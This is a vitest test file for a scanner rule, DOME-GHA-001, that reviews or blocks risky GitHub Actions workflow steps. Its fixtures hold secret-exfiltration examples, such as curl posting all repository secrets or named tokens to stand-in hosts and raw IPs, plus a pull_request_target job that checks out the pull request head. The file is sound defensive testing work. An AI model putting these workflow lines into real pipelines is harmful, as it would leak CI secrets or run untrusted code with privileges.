import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import rule from './gha-001.js';

const wf = (on: string, steps: string) => `on: ${on}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;

describe('DOME-GHA-001', () => {
  it('reports any changed workflow in a diff scan', async () => {
    const after = wf('push', '      - run: npm test\n');
    expect(await runRule(rule, { '.github/workflows/ci.yml': after }, { base: {} })).toEqual(['review:changed@.github/workflows/ci.yml']);
  });

  it('stays quiet about ordinary workflows in a full scan', async () => {
    expect(await runRule(rule, { '.github/workflows/ci.yml': wf('push', '      - run: npm test\n') })).toEqual([]);
  });

  it('blocks secrets sent to curl', async () => {
    const steps = '      - run: curl -d "${{ toJSON(secrets) }}" https://example.invalid/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['block:secretsToNetwork@.github/workflows/x.yml:6']);
  });

  it('blocks posts to a raw IP', async () => {
    const steps = '      - run: wget http://192.0.2.1/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['block:rawIp@.github/workflows/x.yml:6']);
  });

  it('weighs pull_request_target and blocks checking out the PR head', async () => {
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('pull_request_target', '      - run: echo hi\n') })).toEqual([
      'review:pullRequestTarget@.github/workflows/x.yml:1',
    ]);
    const steps = '      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('pull_request_target', steps) })).toEqual([
      'block:checksOutPrHead@.github/workflows/x.yml:8',
    ]);
  });

  it('reviews, not blocks, one named secret sent over HTTPS to a named host', async () => {
    const steps = '      - run: curl -s -d "token=${{ secrets.DEPLOY_TOKEN }}" https://deploy.example.invalid/hook\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
  });

  it('reviews a secret that is itself the URL being called', async () => {
    const steps = '      - run: curl -X POST -d {} "${{ secrets.BUILD_HOOK }}?branch=main"\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
    const data = '      - run: curl -X POST -d "${{ secrets.T }}"\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', data) })).toEqual(['block:secretsToNetwork@.github/workflows/x.yml:6']);
  });

  it('still blocks a named secret sent over plain HTTP or to a raw IP', async () => {
    const http = '      - run: curl -d "${{ secrets.T }}" http://example.invalid/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', http) })).toContain('block:secretsToNetwork@.github/workflows/x.yml:6');
    const ip = '      - run: curl -d "${{ secrets.T }}" https://192.0.2.1/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', ip) })).toContain('block:secretsToNetwork@.github/workflows/x.yml:6');
  });

  it('ignores loopback and private addresses but not public ones after them', async () => {
    const local = '      - run: curl http://127.0.0.1:7690/ping http://172.30.0.30:10000 http://192.168.1.5/x http://10.0.0.1/\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', local) })).toEqual([]);
    const mixed = '      - run: curl http://127.0.0.1/ping http://192.0.2.7/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', mixed) })).toEqual(['block:rawIp@.github/workflows/x.yml:6']);
  });

  it('does not mistake a hostname that starts with digits for an address', async () => {
    const steps = '      - run: curl http://1.2.3.4.example.invalid/x\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual([]);
  });
});
